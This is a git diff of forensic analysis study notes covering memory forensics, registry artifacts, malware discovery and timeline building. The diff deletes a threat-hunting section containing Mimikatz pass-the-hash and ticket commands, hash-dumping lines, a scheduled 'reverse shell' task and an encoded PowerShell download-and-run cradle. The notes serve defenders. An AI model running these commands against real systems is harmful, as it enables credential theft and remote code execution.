 - String analysis of the dump can idenitify data items like domain names, IP addresses, and passwords
 - vaddump is similar but dumps every section to a separate file
 
-<br>
+
 
 ### strings
 - Valuable information
@@ -2920,7 +3532,7 @@ sort strings.txt > sorted_strings.txt
 ```  
 - Alternative for Windows: bstrings.exe
 
-<br>
+
 
 ### grep
 - -i ignore case
@@ -2939,7 +3551,7 @@ grep -i "command prompt" conhost.uni
 - ```consoles``` prints commands (inputs) + screen buffer (outputs)
 - Plugins can identify info from active and closed sessions
 
-<br>
+
 
 ### Windows 10 Memory Compression
 - Win 10 has also implemented compression for the pagefile as well as in frequently used areas of RAM
@@ -2948,7 +3560,7 @@ grep -i "command prompt" conhost.uni
   - Facilitates decompression as compressed pages of memory are detected
   - Can take advantage of Volatility plugins
 
-<br>
+
 
 ### dumpfiles
 - Dump File_Objects from memory
@@ -2967,7 +3579,7 @@ grep -i "command prompt" conhost.uni
 vol.py -f memory.img dumpfiles -n -i -r \\.exe --dump-dir=./output
 ```
 
-<br>
+
 
 ### filescan
 - Scan for File_Objects in memory
@@ -2983,7 +3595,7 @@ vol.py -f memory.img filescan
 voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 ```
 
-<br>
+
 
 ### Registry Artifacts - shimcachemem
 - Parses the Application Compatibility ShimCache from kernel memory
@@ -2996,7 +3608,7 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 - One of the only tools available to extract cached ShimCache entires directly from kernel memory without requiring a system shutdown
 - Contents will often include data not yet written to the registry
 
-<br>
+
 
 ### Extracted File Analysis
 - AV scannning
@@ -3004,7 +3616,7 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 - Dynamic Analysis
 - Static malware debugging and disassembly
 
-<br>
+
 
 ### Live Analysis
 - [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
@@ -3014,18 +3626,18 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 - [Velociraptor](https://github.com/Velocidex/velociraptor)
 - [Veloxity Volcano](https://www.volexity.com/products-overview/volcano/)
 
-<br>
+
 
 ---
 
-<br>
+
 
 # Windows Forensics
 
 ## SANS Windows Forensic Analysis Poster
 * [Link](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)
 
-<br>
+
 
 ## Registy Overview
 
@@ -3069,7 +3681,7 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 	- AMCACHE.hve
 	- Excecution data
 
-<br>
+
 
 ## Users and Groups
 
@@ -3087,7 +3699,7 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 	- Users
 	- Remote Desktop Users
 
-<br>
+
 
 ## System Configuration
 
@@ -3182,11 +3794,11 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 - Determine if the user properly shuts down their machine
 
 
-<br>
+
 
 ---
 
-<br>
+
 
 # Malware Discovery
 
@@ -3201,7 +3813,7 @@ voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
 yara64.exe -C compiled-rules-file <file or directory>
 ```
 
-<br>
+
 
 ### Sigcheck
 - Microsoft tool designed to validate digital signatures
@@ -3212,7 +3824,7 @@ yara64.exe -C compiled-rules-file <file or directory>
 sigcheck -c -e -h -v <dir-of-exe> > sigcheck-results.csv
 ```  
 
-<br>
+
 
 ### DensityScout
 - Checks for possible obfuscation and packing
@@ -3224,7 +3836,7 @@ sigcheck -c -e -h -v <dir-of-exe> > sigcheck-results.csv
 densityscout -pe -r -p 0.1 -o results.txt <directory-of-exe>
 ```  
 
-<br>
+
 
 ### capa
 - File capability identification
@@ -3255,12 +3867,12 @@ capa.exe -f pe -v <file>
 upx -d p_exe -o p_exe_unpacked
 ```  
 
-<br>
+
 
 ### Putting It All Together
 - Poor Density Score + No Digital Signature + Anomalistic Behavior - Known Good = Suspicious Files
 
-<br>
+
 
 ## Malware Discovery Process
 
@@ -3278,7 +3890,7 @@ yarac64.exe '.\rules\index.yar' yara-rules
 yara64.exe -C yara-rules -rw G:\ > 'C:\Tools\Malware Analysis\yara-rules-out.txt'
 ```  
 
-<br>
+
 
 ### Sigcheck
 - Copy the signature file directories from the triage image location ```C\Windows\System32\CatRoot``` to analysis machine location: ```C\Windows\System32\CatRoot```
@@ -3296,14 +3908,14 @@ sigcheck.exe -s -c -e -h -v -vt -w 'C:\Tools\Malware Analysis\sigcheck-results.c
 - Note n/a Publishers
 - Note recent PE compliation timestamps
 
-<br>
+
 
 ### DensityScout
 ```bash
 densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 ```
 
-<br>
+
 
 # (4) Timeline Analysis
 
@@ -3315,7 +3927,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 - Extremely Hard for Anti-Forensics to Succeed -- Too many Time Entries
 - Adversaries Leave Footprints Everywhere on System
 
-<br>
+
 
 ### Forensic Trinity
 - Filesystem Metadata
@@ -3325,7 +3937,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 ### Windows Artifacts
 - [SANS Windows Forensic Analysis Poster](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)
 
-<br>
+
 
 ### The Pivot Point
 - Challenge: Where do I begin to look?
@@ -3339,11 +3951,11 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
   - Example: Program execution followed by multple writes to C:\Windows\System32 and updating registry entries
   - You can also use the "pivot point" to help identify potential malware by finding suspicious files and finding how they interact with the sytem via the timeline
 
-<br>
+
 
 <img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/pivot_points.PNG" />
 
-<br>
+
 
 ### Contect Clues
 - Recovering a single artifact is similar to recovering a single word
@@ -3354,7 +3966,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
   - 2. This tea is too sweet for me to drink! How much sugar is in it?
     - sweet = a taste similar to sugar
 
-<br>
+
 
 ### Timeline Capabilities
 - Filesystem: ```fls or MFTECmd```  
@@ -3367,7 +3979,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
     - CD-ROM
   - Wider OS/Filesystem capability
 
-<br>
+
 
 - Super Timeline: ```log2timeline```  
   - Obtain everything (Kitchen Sink)
@@ -3375,7 +3987,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
   - Artifact timestamps
   - Registry timestamps
 
-<br>
+
 
 ### Analysis Process
 1. Determine Timeline Scope: What questions do you need to answer?
@@ -3390,7 +4002,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
   - Focus on the context of evidence
   - Use Windows Forensic Analysis Poster "Evidence of..."
 
-<br>
+
 
 ## Filesystem Timeline Creation and Analysis
 
@@ -3415,7 +4027,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 - HFS+
 - UFS1&2
 
-<br>
+
 
 ### NTFS Timestamps
 - **M: Data Content Change Time (Focus)**
@@ -3430,11 +4042,11 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 - UTC Time Format (NTFS)
 - Local Time (FAT)
 
-<br>
+
 
 <img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/macb.PNG" />
 
-<br>
+
 
 ### Timestamp Rules Exceptions
 - Applications
@@ -3452,7 +4064,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 - Scanning
   - Depends on how well the A/V is written
 
-<br>
+
 
 ### Understanding Timestamps - Lateral Movement Analysis
 - File copied to remote system
@@ -3460,7 +4072,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
   - Modification time: maintains the original modification time
   - Use as a "Pivot Point"
 
-<br>
+
 
 ### Filesystem Timeline Format
 - Columns
@@ -3473,7 +4085,7 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
   - File Name
     - Deleted files are appended with "deleted"
 
-<br>
+
 
 ### Create Triage Timeline Bodyfile Step 1 - MFTECmd.exe
 - -f "filename" ($MFT, $J, $BOOT, $SDS)
@@ -3488,14 +4100,14 @@ densityscout.exe -r -pe -p 0.1 -o 'C:\Tools\densityscout-results.txt' G:\
 MFTECmd.exe -f "E:\C\$MFT --body "G:\timeline" --bodyf mft.body --blf --bdl C:
 ```
 
-<br>
+
 
 ### Create Triage Timeline Body File Step 1 - fls
 - The fls tool allows use to interact with a forensics image as though it were a normal filesystem
 - The fls tool in the Sleuth Kit can be used to collect timeline information from the filename layer
 - It take the inode value of a directory, processes the contents, and displays the filenames in the directory (including deleted items)
 
-<br>
+
 
 ### Create Triage Image Timeline Step 2 - mactime
 - The mactime tool is a perl script that takes bodyfile formatted files as input
@@ -3506,7 +4118,7 @@ MFTECmd.exe -f "E:\C\$MFT --body "G:\timeline" --bodyf mft.body --blf --bdl C:
 mactime [options] -d -b boddyfile -z timezone > timeline.csv
 ```
 
-<br>
+
 
 # Super Timelines
 
@@ -3530,7 +4142,7 @@ mactime [options] -d -b boddyfile -z timezone > timeline.csv
 6. More File Execution
   - .A.B (first executed)
 
-<br>
+
 
 ## Malware Execution Example
 0. Identify suspicious execution event
@@ -3549,14 +4161,14 @@ mactime [options] -d -b boddyfile -z timezone > timeline.csv
 6. Logoff
   - 4634
 
-<br>
+
 
 ## Process
 1. log2timeline - Extract timeline
 2. psort - Post processing and output
 3. pinfo - Display storage metadata
 
-<br>
+
 
 ## log2timeline usage
 ```bash
@@ -3570,7 +4182,7 @@ log2timeline.py [STORAGE FILE] [SOURCE]
 - --help: list all options with usage descriptions
 - [Plaso](https://plaso.readthedocs.io/en/latest/)
 
-<br>
+
 
 ## Target Examples
 - Raw Image
@@ -3597,7 +4209,7 @@ log2timeline.py --partition 2 /path-to/plaso.dump /path-to/image.dd
 ```bash
 log2timeline.py /path-to/plaso.dump/ /triage-output/
 ```  
-<br>
+
 
 ## Targeted Timeline Creation
 - Parsers
@@ -3614,7 +4226,7 @@ log2timeline.py /path-to/plaso.dump/ /triage-output/
   - [Filter Files Plaso Github](https://github.com/log2timeline/plaso/tree/main/data)
 - Grab Kape Triage Image -> Run through plaso: ```log2timeline.py /path-to/plaso.dump/ /triage-output/```  
 
-<br>
+
 
 ## Filtering Super Timelines
 
@@ -3633,7 +4245,7 @@ log2timeline.py /path-to/plaso.dump/ /triage-output/
 pinfo.py -v plaso.dump
 ```  
 
-<br>
+
 
 ### psort.py
 - --output-time-zone ZONE - Converts stored times to specified time zone
@@ -3647,7 +4259,7 @@ pinfo.py -v plaso.dump
 ```bash
 psort.py --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv plaso.dump FILTER
 ```  
-<br>
+
 
 ### Case Study: Web Server Intrusion
 - Step 1: Parse Triage Image from Web Server
@@ -3687,7 +4299,7 @@ psort.py  --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv plaso.dump "da
 - Wildcards are supported in column filters
 - [Colorized Super Timeline Template for Log2timeline Output Files](https://www.sans.org/blog/digital-forensic-sifting-colorized-super-timeline-template-for-log2timeline-output-files/)
 
-<br>
+
 
 ### Super Timeline Creation
 
@@ -3696,28 +4308,28 @@ psort.py  --output-time-zone 'UTC' -o l2tcsv -w supertimeline.csv plaso.dump "da
 MFTECmd.exe -f '.\Location\C\$MFT' --body 'D:\Path\To Save\Timeline' --bodyf hostname-mftecmd.body --blf --bdl C:
 ```  
 
-<br>
+
 
 - Convert body file to csv (triage timeline)
 ```bash
 mactime -z UTC -y -d -b hostname-mftecmd.body > hostname-filesystem-timeline.csv
 ```  
 
-<br>
+
 
 - Tune out unnecessary noise
 ```bash
 grep -v -i -f timeline_noise.txt hostname-filesystem-timeline.csv > hostname-filesystem-timeline-final.csv
 ```  
 
-<br>
+
 
 - List Timezones
 ```bash
 log2timeline.py -z list
 ```
 
-<br>
+
 
 - Timeline Windows artifacts
 ```bash
@@ -3734,13 +4346,13 @@ log2timeline.py --parsers 'mactime' --storage-file ../plaso.dump ./hostname-mfte
 psort.py --output-time-zone 'UTC' -o l2tcsv -w ./plaso.csv ./plaso.dump "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser != 'winevtx'))"
 ```  
 
-<br>
+
 
 ```bash
 grep -a -v -i -f timeline_noise.txt plaso.csv > hostname-supertimeline-final.csv
 ```  
 
-<br>
+
 
 ## Supertimeline Analysis
 
@@ -3758,7 +4370,7 @@ grep -a -v -i -f timeline_noise.txt plaso.csv > hostname-supertimeline-final.csv
 - LNK files provide evidence of file and folder opening
   - Review the LNK files present in the ```C:/Users/<user>/AppData/Roaming/Microsoft/Windows/Recent``` directory
 
-<br>
+
 
 ### Filtering
 - Filter for "AppCompatCache Registry Entry" in the "Source Description" column
@@ -3773,477 +4385,11 @@ grep -a -v -i -f timeline_noise.txt plaso.csv > hostname-supertimeline-final.csv
 - Filter for "Registry Key: BagMRU" (Folder Opening)
 - GUI program execution using a filter for the artifact "Registry Key: UserAssist"
 
-<br>
+
 
 ---
 
-<br>
 
-# Threat Hunting
-
-## Common Malware Names
-* [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)
-
-<br>
-
-## Common Malware Locations
-* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)
-
-<br>
-
-## Living of the Land Binaries
-* [LOLBAS Project](https://lolbas-project.github.io/)  
-
-**RUNONCE.EXE**
-- Executes a Run Once Task that has been configured in the registry
-```
-Runonce.exe /AlternateShellStartup
-```
-
-**RUNDLL32.EXE**
-- Used by Windows to execute dll files
-```
-rundll32.exe AllTheThingsx64,EntryPoint
-```
-
-**WMIC.EXE**
-- The WMI command-line (WMIC) utility provides a command-line interface for WMI
-```
-wmic.exe process call create calc
-```
-
-**NETSH.EXE**
-- Netsh is a Windows tool used to manipulate network interface settings.
-```
-netsh.exe add helper C:\Users\User\file.dll
-```
-
-**SCHTASKS.EXE**
-- Schedule periodic tasks
-```
-schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
-```
-
-**MSIEXEC.EXE**
-- Used by Windows to execute msi files
-```
-msiexec /quiet /i cmd.msi
-```
-
-<br>
-
-## Persitence Locations
-
-### Common Autostart Locations
-```
-NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
-NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
-SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
-SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
-SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
-%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-```
-
-**Tools**
-* Autoruns
-* Kansa
-
-<br>
-
-### Services
-```
-HKLM\SYSTEM\CurrentControlSet\Services
-```
-* 0x02 = Automatic
-* 0x00 = Boot Start of a Device Driver
-* "sc" command can create services
-
-**Tools**
-* Autoruns
-* "sc" command
-* Kansa
-
-<br>
-
-### Scheduled Tasks
-- at.exe
-	- Deprecated but present in WinXP and Win7+
-	- Recorded in at.job files and schdlgu.txt (XP)
-- schtasks.exe
-	- Activitiy logged in Task Scheduler and Security Logs
-
-```powershell
-schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
-```
-
-Tools:
-- Autoruns
-- Kansa
-
-<br>
-
-### DLL Hijacking
-
-DLL Search Order Hijacking
-- Place malicious file ahead of DLL in search order
-- Windows looks at Application directory prior to Windows/System32 folder
-- Look at exe's import table
-- Exception: DLLs present in the KnownDLLs Registry Key
-
-Phantom DLL Hijacking
-- Find DLLs that applications attempt to load, but doesn't exist
-
-DLL Side Loading
-- WinSXS provides a new version of a legit DLL
-
-Relative Path DLL Hijacking
-- Copy target .exe and corresponding bad .dll to a different location
-
-Common DLL Search Order
-1. DLLs already in memory
-2. Side-by-side components
-3. KnownDLLs List
-4. Directory of the application
-5. C:\Windows\System32
-6. C:\Windows\System
-7. C:\Windows
-8. Current Directory
-9. System %PATH%
-
-<br>
-
-### Hunting DLL Hijacking
-- Machines rarely get new dlls (Application Install/Patching)
-
-File system analysis
-- Look for new or unsigned .exe/.dll files in unusual places
-
-Memory Analysis
-- Find system process or DLLs loaded from the wrong location
-
-This technique is often followed up C2 network beaconing
-
-<br>
-
-### WMI Event Consumer Backdoors
-- Allows triggers to be set that will run scripts and executables
-- Event Filter: Trigger Condition
-- Event Consumer: Script or executable to run
-- Binding: Combine Filter and Consumer
-
-Tools
-- Kansa
-- Autoruns
-
-Discover Suspicious WMI Events
-```powershell
-Get-WMIObject -Namespace root\Subscription -Class __EventFilter
-Get-WMIObject -Namespace root\Subscription -Class __Event Consumer
-Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
-```
-<br>
-
-### Hunting WMI Persistence
-- Look at consumers (CommandLine and Active Script)
-	- Correlate to Event Filter (trigger)
-- Search
-	- .exe
-	- .vbs
-	- .ps1
-	- .dll
-	- .eval
-	- ActiveXObject
-	- powershell
-	- CommandLineTemplate
-	- ScriptText
-- Common WMI Occurences
-	- SCM Event Log Consumer
-	- BVTFilter
-	- TSlogonEvents.vbs
-	- TSLogonFilter
-	- RAevent.vbs
-	- RmAssistEventFilter
-	- KernCap.vbs
-	- NETEventLogConsumer
-	- WSCEAA.exe (Dell)
-
-<br>
-
-### Hunt and Analyze Persistence with Autoruns
-- Live System Only
-- Works for Autostart locations, Services, Scheduled Tasks, WMI Events
-- Hashes files and can search VirusTotal for hits
-
-1. Run autorunsc
- ```
- C:\>autorunsc -accepteula -a * -s -h -c -vr > \\server\share\autoruns.csv
- ```
-2. Open .csv with tool of choice (e.g. Excel or TimelineExplorer)
-3. Filter out trusted startup locations
-	- Use signers to filter trusted code signers (can lead to false negative but is still a good place to start)
-	- Look for:
-		- (Not Verified)
-		- Unfamiliar Signers
-		- Blank (No Signer)
-4. Filter by Enabled (Active)
-5. Compare hashes to VirusTotal
-6. Research vendor and product listed in "Publisher" and "Description" fields
-7. Compare output to a the output of a known good machine
-
-<br>
-
-## Lateral Movement
-
-### Detecting Credential Harvesting
-- Event Logs
-	- 4624 Logons
-	- 4720 Account Creation
-	- 4776 Local Account Auth
-	- 4672 Privileged Account Usage
-- Unix "secure"logs
-- Auditing New Accounts
-- Anomalous Logins
-	- Workstation to Workstation
-	- Sensitive Networks
-- After Hour Logins
-
-**Mitigations (Win10)**
-- Credential Guard: Moves credentials (hashes & ticket) into virtual enclave
-- Remote Credential Guard: RDP without pushing credentials to remote target
-- Device Guard (Prevent execution of untrusted code)
-
-**Hunt Notes**
-- WDigest Plaintext Credentials
-	- HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
-		- UseLogonCredential = "1" (Should be 0)
-
-<br>
-
-### Hashes
-- Availabe in the LSASS process
-- Can be extracted with admin privileges
-- Local account password hashes are available in the SAM hive in memory or on disk
-- Domain account hashes are present in memory during interactive sessions
-
-**Common Tools**
-- Mimikatz
-- fgdump
-- gsecdump
-- Metasploit
-- AceHash
-- PWDumpX
-- creddump
-- WCE
-
-**Pash-the-Hash Attack**
-- Authenticate using a stolen account hash without knowing the cleartext password
-	- Tools: Metasploit PsExec module, WCE, and SMBshell
-- Limited to NTLM authentication
-- Often used to map shares, perform PsExec-style remote execution, and WMI
-- [Protecting Privileged Domain Accounts: Safeguarding Password Hashes](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-password-hashes/)
-- [Slides on Mimikatz 2.0](https://lira.epac.to/DOCS-TECH/Hacking/Mimikatz/Benjamin%20Delpy%20-%20Mimikatz%20a%20short%20journey%20inside%20the%20memory%20of%20the%20Windows%20Security%20service.pdf)
-- [Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft, Version 1 and 2](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
-
-**Examples**
-- Hash dump with Gsecdump
-```
-gsecdump.exe -a > 1.txt
-```
-
-- Pass the Hash (Mimikatz)
-```
-mimikatz # sekurlsa::pth /user:username /domain:computername /ntlm:hash /run:".\psexec.exe -accepteula \\10.10.10.10 cmd.exe"
-```
-
-<br>
-
-### Credential Availability on Targets
-
-| **Admin Action** | **Logon**<br>**Type** | **Credentials**<br>**on Target?** | **Notes** |
-| :---------------: | :---------------: | :---------------: | :---------------: |
-| Console Logon | 2   | Yes*   |   *Except when Credential Guard is enabled  |
-| RunAs | 2   | Yes*   |  *Except when Credential Guard is enabled    |
-| Remote Desktop | 10   | Yes*   | *Except when Remote Credential Guard is enabled    |
-| Net Use | 3   | No   | Including /u:parameter    |
-| PowerShell Remoting | 3   | No   | Invoke-Command; Enter-PSSession   |
-| PsExec Alternate Creds | 3+2   | Yes    | -u <<username>> -p <<password>>   |
-| PsExec w/o Explicit Creds | 3   |  No   |    |
-| Remote Scheduled Task | 4   | Yes    | Password saved as LSA Secret   |
-| Run as a Service | 5   | Yes    | (w/user account)-Password saved as LSA Secret   |
-| Remote Registry | 3   | No    |    |
-
-<br> 
-
-### Tokens
-- Targets user sessions and running services
-- Used for SSO
-- Attacker can impersonate user's security context
-- ```SeImpersonate``` privileges let tokens be copied from processes (also SYTEM or admin)
-- Can allow adding user or managing group membership, mapping of remote shares, or Running PsExec (delegate tokens only)
-- Often used to escalate from local to domain admin
-
-**Token Stealing (Mimikatz)**
-- Assumes attacker has local admin
-```
-mimikatz # privilege::debug
-mimikatz # token:whoami
-mimikatz # token:elevate /domain admin (identifies any domain admins present on the system)
-```
-
-**Common Tools**
-- Incognito
-- Metasploit
-- PowerShell (PowerShell Empire)
-- Mimikatz
-
-**Hunting**
-- [Monitoring for Delegation Token Theft](https://www.sans.org/blog/monitoring-for-delegation-token-theft/)
-
-<br>
-
-### Cached Credentials
-- Stored domain credentials to allow logons when off domain
-- Cached credentials hashes have to be cracked
-- Salted and case-sensitive (slow to crack)
-- Cannot be used in pass the hash
-- Stored in the SECURITY\Cache registry key
-- Admin or SYSTEM privileges required
-- Hashes cracked with John the Ripper or hashcat
-
-**Common Tools**
-- cachedump
-- Metasploit
-- PWDumpX
-- creddump
-- AceHash
-
-**Cached Credential Extraction with Creddump**
-
-```./pwdump.py SYSTEM SAM true``` <- Local NT Hashes  
-```./cachedump.py SYSTEM SECURITY true``` <- Cached Hashes
-
-
-<br>
-
-### LSA Secrets
-- Credential stored in registry to allow services or tasks to be run with user privileges
-- May also hold application passwords like VPN or auto-logon credentials
-- Admin privileges allow access to encrypted registry data and keys necessary to decrypt
-	- Stored SECURITY/Policy/Secrets
-	- Parent key in SECURITY/Policy can decode
-- Passwords are plaintext
-
-<br>
-
-### Decrypt LSA Secrets with Nishang
-- Requires Admin
-- Gain permissions necessary to access the Security registry hive with ```Enable-DuplicateToken```
-- Dump registry data with ```Get-LsaSecret.ps1```  
-
-**Common Tools**
-- Cain
-- Metasploit
-- Mimikatz
-- gsecdump
-- AceHash
-- creddump
-- PowerShell
-
-<br>
-
-### Tickets - Kerberos
-- Kerberos issues tickets to authenticated users
-- Cached in memory and valid for 10 hours
-- Tickets can be stolen from memory and used to authenticate else where (Pass the Ticket)
-- Access to the DC allows tickets to be created for any user with no expiration (Golden Ticket)
-- Service account tickets can be requested an forged, including offline cracking of service account hashes (Kerberoasting)
-
-**Common Tools**
-- Mimikatz
-- WCE
-- kerberoast
-
-<br>
-
-### Pass the Ticket with Mimikatz
-- Dump Tickets
-```mimikatz # sekurlsa::tickets /export```
-- Import ticket elsewhere
-```mimikatz # keberos::ptt [ticket]```
-- Now available to authenticate to throughout environment
-
-<br>
-
-### Kerberos Attacks
-- Pass the Ticket
-	- Steal Ticket from memory and pass or import on other systems
-- Overpass the Hash
-	- Use NT hash to request a service ticket from the same account
-- Kerberoasting
-	- Request service ticket for highly privileged service and crack NT hash
-- Golden Ticket
-	- Kerberos TGT for any account with no expiration. Survives full password reset
-- Silver Ticket
-	- All-access pass for a single service or computer
-- Skeleton Key
-	- Patch LSASS on domain controller to add backdoor password that works for any domain account
-- DCSync
-	- Use fake Domain Controller replication to retrieve hashes (and hash history) for any account without login to the DC
-- [PROTECTING WINDOWS NETWORKS – KERBEROS ATTACKS](https://dfirblog.wordpress.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)
-
-<br>
-
-### NTDS.DIT
-- Active Directory Domain Services (AD DS) database holds all user and computer account hashes (LM/NT) in the domain
-- Encrypted but algorithm is easy to decrypt
-- Located in the \Windows\NTDS folder on Domain Controller
-- Requires admin accessto load driver to access raw disk or use Volume Shadow Copy Service
-
-**Common Tools**
-- ntdsutil
-- VSSAdmin
-- NTDSXtract
-- Metasploit
-- PowerShell
-- secretsdump.py
-
-<br>
-
-### Bloodhound - Find a Path to Domain Admin
-- Active Directory relationship graphing tool
-	- Nodes: Users, Computers, Groups, OUs, GPOs
-	- Edges: MemberOf, HasSession, AdminTo, TrustedBy
-	- Paths: A list of nodes connected by edges (Path to Domain Admin)
-	- Visualizes dangerous trust relationships and misconfigurations
-	- Reduces brute-force effort required
-	- Difficult to detect (Uses prodominantly LDAP)
-		- Uses cached LDAP connections
-	- [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
-		- Uses PowerShell Empire to enumerate accounts, perform cred theft, and lateral movement
-	- [GoFetch](https://github.com/GoFetchAD/GoFetch)
-		- Automates BloodHound findings
-		- Uses ```Invoke-Mimikatz``` and ```Invoke-Psexec``` to auto cred theft and lateral movement
-	- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
-
-	<img alt="BloodHound" src="https://i0.wp.com/wald0.com/wp-content/uploads/2017/05/TransitiveControllers.png?ssl=1" />
-
-
-<br>
-
----
-
-<br>
-
-# Misc
-
-## Decode Base64
-
-```bash
-echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8
-```
-
-<br>
 
 # (5) Anti-Forensics Detection
 
@@ -4256,20 +4402,20 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
 - Data Encryption (.rar files)
 - Fileless Malware
 
-<br>
+
 
 ### Registry
 - Registry Key/Value Deletion
 - Registry Key/Value Wiping
 - Hiding Scripts in Registry
 
-<br>
+
 
 ### Other
 - Event Log Deletion/Tampering
 - Process Evasion - Rootkits and Code Injection
 
-<br>
+
 
 ## Recovery of Deleted Files via VSS
 
@@ -4279,7 +4425,7 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
 - Introduction of "ScopeSnapshots" in Windows 8+ limits effectiveness (excludes user profiles)
   - Disable by setting ```HKLM\Software\Microsoft\WindowsNT\CurrentVersion\SystemRestore``` to 0
 
-<br>
+
 
 ### Volume Shadow Examination
 - Triage Analysis
@@ -4293,7 +4439,7 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
   - vshadowinfo
   - vshadowmount
 
-<br>
+
 
 ## Advanced NTFS Filesystem Tactics
 
@@ -4305,13 +4451,13 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
   - Permissions
 - Each metadata structure is given a numeric address
 
-<br>
+
 
 ### MFT Entry Allocated
 - Metadata filled out (name, timestamps, permissions, etc.)
 - Pointers to clusters containing file contents (or the data itself, if the file is resident)
 
-<br>
+
 
 ### MFT Entry Unallocated
 - Metadata may or may not be filled out
@@ -4319,13 +4465,13 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
 - The clusters pointed to may or may not still contain the deleted file's data
   - The clusters may have been resused
 
-<br>
+
 
 ### Sequential MFT Entries
 - As files are created, regardless of their directories, MFT allocation patterns are generally sequential and not random
 - Use analysis of contiguous metadata values to find files likely created in quick succession, even across different directories
 
-<br>
+
 
 ### istat - Analyzing File System Metadata
 - Displays statistics about a given metadata structure (inode), including MFT entries
@@ -4354,11 +4500,11 @@ echo  "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AV
     - Another for the short file name
     - One $DATA attribute
 
-<br>
+
 
 <img alt="FILE_NAME_MACB" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/FILE_NAME_MACB.PNG" />
 
-<br>
+
 
 ### Detecting Timestamp Manipulation
